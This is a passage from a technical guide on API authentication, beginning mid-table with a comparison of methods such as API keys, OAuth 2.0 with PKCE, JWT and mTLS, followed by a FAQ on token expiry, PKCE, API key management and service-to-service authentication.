| API Key | Server-to-server, internal API | Medium (hash storage) | Low | Yes |
| Bearer Token | General-purpose API auth | Medium | Medium | Depends |
| OAuth 2.0 + PKCE | SPA, mobile | High | High | Depends |
| OAuth 2.0 Client Credentials | Server-to-server | High | Medium | Depends |
| JWT | Stateless auth | High (RS256 recommended) | Medium | Yes |
| mTLS | Financial, medical, government | Highest | High | Yes |

Authentication method selection is based on a balance of security requirements, user experience, implementation cost, and operational cost. There is no single "best method"; an appropriate choice must be made based on the characteristics of the application and its risk profile.

---

## FAQ

### Q1. What is an appropriate expiry time for JWTs?

Access Tokens are generally set to 15 minutes to 1 hour. Shorter expiries increase security but increase the frequency of token renewals via Refresh Tokens, impacting user experience and server load. For financial systems, under 5 minutes; for general web applications, 15 to 30 minutes; for internal APIs, 1 hour are common guidelines. Refresh Tokens typically range from 7 to 90 days, balanced against the desired re-login frequency. The key concept is that the expiry limits the impact window in the event of an Access Token leak.

### Q2. Why use PKCE instead of Implicit Flow with OAuth 2.0?

In Implicit Flow, the Access Token is returned directly in the browser's address bar (URL fragment), creating a risk of leakage through browser history or Referer headers. Additionally, no Refresh Token is issued, so the user must re-authenticate each time the token expires. With Authorization Code Flow + PKCE, the authorization code is passed via the front channel, but cannot be exchanged for tokens without the code_verifier, making it safe against authorization code interception attacks. A Refresh Token is also issued, improving user experience. Since Implicit Flow is scheduled for removal in the OAuth 2.1 draft, new development should always adopt PKCE.

### Q3. How do I manage API Keys securely?

Secure API Key management requires multiple layers. For storage, hash with SHA-256 or similar and never store in plaintext. Display the plaintext key to the user only once at issuance; it should be irretrievable afterward. Operationally, restrict scopes (permissions) per key and configure rate limits. Regular rotation (every 90 days, for example) is recommended, and a grace period (e.g., 24 hours) during which the old key remains valid prevents downtime during transitions. For monitoring, implement detection of unused keys, detection of abnormal access patterns, and automatic detection of key leaks (e.g., commits to GitHub). Leveraging existing tools such as GitHub Secret Scanning or AWS Secrets Manager is also effective.

### Q4. Should I use JWT or mTLS for authentication between microservices?

The two are not mutually exclusive — combining them is ideal. mTLS provides mutual authentication between services at the transport layer and guarantees encrypted, tamper-proof communication. JWT carries user context (on whose behalf the request is made) at the application layer. When using a service mesh like Istio, mTLS is handled transparently at the infrastructure layer, allowing application code to focus on JWT validation. If only one must be chosen due to budget or technical constraints: choose JWT if propagating user context is required, or mTLS if strong mutual authentication between services is the priority.
